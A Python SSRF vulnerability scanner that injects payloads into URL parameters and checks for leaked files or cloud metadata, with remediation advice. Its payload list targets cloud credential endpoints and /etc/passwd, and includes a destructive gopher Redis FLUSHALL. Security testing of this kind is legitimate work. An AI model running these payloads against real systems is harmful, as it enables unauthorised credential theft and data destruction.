import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import socket
import time

class SSRFScanner:
    def __init__(self):
        self.payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://0.0.0.0",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:27017",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean metadata
            "http://169.254.169.254/metadata/instance?api-version=2019-06-01",  # Azure metadata
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://localhost:11211/",
            "gopher://localhost:6379/_FLUSHALL",
            "http://metadata.nicob.net/",  # Metadata service detector
            "https://webhook.site/token"  # Webhook service to detect outbound connections
        ]
        
    def scan(self, url):
        """Scan a URL for SSRF vulnerabilities"""
        vulnerabilities = []
        
        # Check if URL has parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            # No parameters to test
            return vulnerabilities
            
        # Look for URL-like parameters
        url_params = []
        for param, values in params.items():
            for value in values:
                if value.startswith(('http://', 'https://', 'ftp://', '//')):
                    url_params.append(param)
                    break
                elif 'url' in param.lower() or 'link' in param.lower() or 'path' in param.lower() or 'file' in param.lower():
                    url_params.append(param)
                    break
        
        # If no URL-like parameters found, test all parameters
        if not url_params:
            url_params = list(params.keys())
        
        # Test each parameter
        for param in url_params:
            for payload in self.payloads:
                # Create a new set of parameters with the payload
                new_params = params.copy()
                new_params[param] = [payload]
                
                # Rebuild the URL with the new parameters
                query_string = urlencode(new_params, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    parsed_url.fragment
                ))
                
                # Send the request
                try:
                    start_time = time.time()
                    response = requests.get(new_url, timeout=10, allow_redirects=False)
                    end_time = time.time()
                    
                    # Check for signs of successful SSRF
                    if self._check_ssrf_success(response, payload, end_time - start_time):
                        vulnerabilities.append({
                            'type': 'SSRF',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': self._get_ssrf_evidence(response, payload, end_time - start_time),
                            'severity': 'High',
                            'description': 'Server-Side Request Forgery (SSRF) vulnerability detected. The application appears to be making server-side requests to arbitrary domains.',
                            'remediation': 'Implement a whitelist of allowed domains and protocols. Validate and sanitize all user inputs that could be used in server-side requests.'
                        })
                        break  # Found a vulnerability with this parameter, move to the next one
                
                except Exception as e:
                    # Some payloads might cause errors that indicate SSRF
                    if 'ConnectionRefused' in str(e) or 'Connection refused' in str(e):
                        vulnerabilities.append({
                            'type': 'SSRF',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Connection refused error: {str(e)}',
                            'severity': 'Medium',
                            'description': 'Potential Server-Side Request Forgery (SSRF) vulnerability detected. The application appears to be attempting to make server-side requests to internal services.',
                            'remediation': 'Implement a whitelist of allowed domains and protocols. Validate and sanitize all user inputs that could be used in server-side requests.'
                        })
                    else:
                        print(f"Error testing {url} with payload {payload}: {str(e)}")
        
        return vulnerabilities
    
    def _check_ssrf_success(self, response, payload, response_time):
        """Check if the SSRF attempt was successful"""
        # Check for specific content that might indicate successful SSRF
        if 'root:' in response.text and 'passwd' in payload:
            return True
        if '[fonts]' in response.text and 'win.ini' in payload:
            return True
        if 'ami-id' in response.text and 'meta-data' in payload:
            return True
        if 'computeMetadata' in response.text and 'metadata.google' in payload:
            return True
        if 'instanceId' in response.text and 'metadata/instance' in payload:
            return True
        
        # Check for unusual response times that might indicate successful SSRF
        if response_time > 2 and ('localhost' in payload or '127.0.0.1' in payload):
            return True
        
        # Check for unusual status codes
        if response.status_code in [301, 302, 307, 308] and 'Location' in response.headers:
            redirect_url = response.headers['Location']
            if 'localhost' in redirect_url or '127.0.0.1' in redirect_url:
                return True
        
        return False
    
    def _get_ssrf_evidence(self, response, payload, response_time):
        """Get evidence of SSRF vulnerability"""
        if 'root:' in response.text and 'passwd' in payload:
            return f'File content leaked: {response.text[:100]}...'
        if '[fonts]' in response.text and 'win.ini' in payload:
            return f'File content leaked: {response.text[:100]}...'
        if 'ami-id' in response.text and 'meta-data' in payload:
            return f'AWS metadata leaked: {response.text[:100]}...'
        if 'computeMetadata' in response.text and 'metadata.google' in payload:
            return f'GCP metadata leaked: {response.text[:100]}...'
        if 'instanceId' in response.text and 'metadata/instance' in payload:
            return f'Azure metadata leaked: {response.text[:100]}...'
        
        if response_time > 2 and ('localhost' in payload or '127.0.0.1' in payload):
            return f'Unusual response time: {response_time:.2f} seconds'
        
        if response.status_code in [301, 302, 307, 308] and 'Location' in response.headers:
            return f'Redirect to: {response.headers["Location"]}'
        
        return 'Unknown evidence'